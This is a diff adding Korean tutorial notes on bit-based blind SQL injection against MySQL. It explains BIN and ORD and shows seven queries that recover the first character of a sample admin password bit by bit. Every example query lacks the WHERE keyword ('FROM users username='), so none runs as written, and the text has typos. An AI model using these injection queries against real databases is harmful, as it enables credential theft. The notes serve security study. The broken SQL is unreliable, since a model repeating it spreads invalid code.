@@ -318,6 +318,40 @@
                     ```
                     - 아스키에서 출력 가능한 문자의 범위를 이진 탐색으로 좁혀가는 과정을 반복하다보면 비밀번호를 한 글자씩 알아낼 수 있음
     - Bit 연산을 이용하는 방법
+        + 7개의 비트에 대해 1인지 비교하여 총 7번의 쿼리로 임의 데이터의 한 바이트를 알아내는 방법
+            - Bit 연산의 출발 배경
+                + 하나의 비트는 0과 1로 이루어져 있으며, ASCII는 0 ~ 127 범위의 문자를 표현할 수 있음 <br/> &nbsp;&nbsp; → 7개의 비트를 통해 하나의 문자를 나타낼 수 있음을 의미함
+            - MySQL의 ```BIN``` 험수와 ```ORD``` 함수
+                | 함수 | 형태 | 설명 |
+                |:---:|:---:|------|
+                | **BIN** | ```BIN(숫자)``` | 인자로 입력된 숫자를 2진수로 반환함 |
+                | **ORD** | ```ORD(문자)``` | ```'A'```와 같이 인자로 입력된 문자의 아스키 코드 값을 반환함 |
+                + 사용 예시
+                    ```sql
+                    SELECT BIN(ORD('A')); # 'A'(문자)를 아스키 코드 값(숫자) 형태로 변환하고, 이를 다시 비트의 형태로 반환함
+                    ```
+        + Bit 연산을 이용한 Blind SQL Injection 공격 예시
+            - users 데이터베이스의 구성 (예시)
+                | username | password |
+                |:---:|------|
+                | admin | P@ssword |
+            - Bit 연산을 이용한 공격 방법
+                + ```SUBSTR```과 ```BIN```을 이용해서 총 7번의 쿼리를 실행해 바이트씩 알아낼 수 있음 → 이를 비밀번호의 길이만큼 반복하여 전체 비밀번호를 알아낼 수 있음
+                + 공격 코드 예시: password의 첫 번째 문자
+                    ```sql
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 1, 1)=1; # 결과가 출력됨 (첫번째 자리 1)
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 2, 1)=1; # 결과가 출력되지 않음 (두번째 자리 0)
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 3, 1)=1; # 결과가 출력됨 (세번째 자리 1)
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 4, 1)=1; # 결과가 출력되지 않음 (네번째 자리 0)
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 5, 1)=1; # 결과가 출력되지 않음 (다섯번째 자리 0)
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 6, 1)=1; # 결과가 출력되지 않음 (여섯번째 자리 0)
+                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 7, 1)=1; # 결과가 출력되지 않음 (일곱번째 자리 0)
+                    # 비밀번호의 첫 번째 바이트: 1010000 → 10진수로 표현하면 80 (문자로 표현하면 'P')
+                    ```
+
+<br/><br/>
+
+### Error based
 
 <br/><br/><br/>
 
